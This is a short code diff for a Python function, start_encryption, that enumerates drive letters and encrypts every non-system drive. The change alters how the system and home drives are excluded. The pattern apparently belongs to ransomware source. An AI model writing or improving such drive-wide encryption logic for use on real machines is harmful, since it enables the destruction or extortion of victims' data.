@@ -324,9 +324,7 @@ def start_encryption():
         for i, letter in enumerate(string.ascii_uppercase)
         if bitmask & (1 << i)
     ]:
-        if not os.path.samefile(
-            disk, os.getenv("SystemDrive") + "/"
-        ) and not os.path.samefile(disk, os.getenv("HOMEDRIVE") + "/"):
+        if disk[:2] != os.getenv("SystemDrive") and disk[:2] != os.getenv("HOMEDRIVE"):
             encrypt_directory(disk, key)
 
 
